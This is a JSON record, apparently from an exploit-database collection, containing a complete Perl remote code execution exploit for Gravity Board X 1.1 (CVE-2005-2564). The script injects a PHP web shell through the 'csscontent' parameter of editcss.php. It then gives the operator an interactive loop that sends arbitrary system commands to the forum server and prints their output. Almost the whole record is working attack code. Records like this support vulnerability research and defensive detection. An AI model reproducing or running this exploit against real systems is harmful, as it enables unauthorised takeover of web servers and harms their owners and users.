{
  "id": "1510",
  "title": "Gravity Board X 1.1 - &#039;csscontent&#039; Remote Code Execution",
  "cve": "CVE-2005-2564",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n\r\n## Gravity Board X v1.1 (possibly prior versions) remote code execution exploit\r\n## (c)oded by 1dt.w0lf\r\n## 14.08.2005\r\n## RST/GHC\r\n## http://rst.void.ru\r\n## http://ghc.ru\r\n\r\nuse LWP::UserAgent;\r\n\r\nif(@ARGV<1) { &usage; exit(0); }\r\n\r\n$path = $ARGV[0];\r\nheader();\r\nprint \"Creating shell... Please wait\\n\";\r\n\r\n$gr = LWP::UserAgent->new() or die;\r\n$res = $gr->get($path.'editcss.php?csscontent=</style><?php error_reporting(0); system($HTTP_POST_VARS[cmd]); ?>');\r\nif($res->as_string =~ /unable to save changes/)\r\n {\r\n print \"Forum unable to save changes in css template. Exploitation failed.\\n\";\r\n exit(0);\r\n }\r\nprint \"DONE.\\n\";\r\n\r\nwhile ()\r\n {\r\n    print \"Type command for execute or 'q' for exit\\nGravity# \";\r\n    while(<STDIN>)\r\n     {\r\n        $cmd=$_;\r\n        chomp($cmd);\r\n        exit() if ($cmd eq 'q');\r\n        last;\r\n     }\r\n    &run($cmd);\r\n }\r\n\r\nsub run()\r\n {\r\n $cmd2  = 'echo 1 && echo _START_ && ';\r\n $cmd2 .= $cmd;\r\n $cmd2 .= ' && echo _END_';\r\n $gr = LWP::UserAgent->new() or die;\r\n $res = $gr->post($path.'index.php',{\"cmd\" => \"$cmd2\"});   \r\n @result = split(/\\n/,$res->content);\r\n $runned = 0;\r\n $on = 0;\r\n print \"\\n\";\r\n for $res(@result)\r\n  {\r\n    if ($res =~ /^_END_/) { print \"\\n\"; return 0; }\r\n    if ($on == 1) { print \"  $res\\n\"; }\r\n    if ($res =~ /^_START_/) { $on = 1; $runned = 1; } \r\n  }\r\n print \"Can't execute command\\n\" if !$runned;\r\n }\r\n\r\nsub header()\r\n{\r\n print \"--* Gravity Board X v1.1 exploit by RST/GHC\\n\";\r\n print \"--* keep it private, not for public\\n\";\r\n}\r\n\r\nsub usage()\r\n {\r\n  header();\r\n  print \"usage : r57Gravity.pl [path_to_forum]\\n\";\r\n  print \"  e.g.: r57Gravity.pl http://127.0.0.1/forum/\\n\";\r\n }\r\n\r\n# milw0rm.com [2006-02-17]",
  "url": "https://www.exploit-db.com/exploits/1510"
}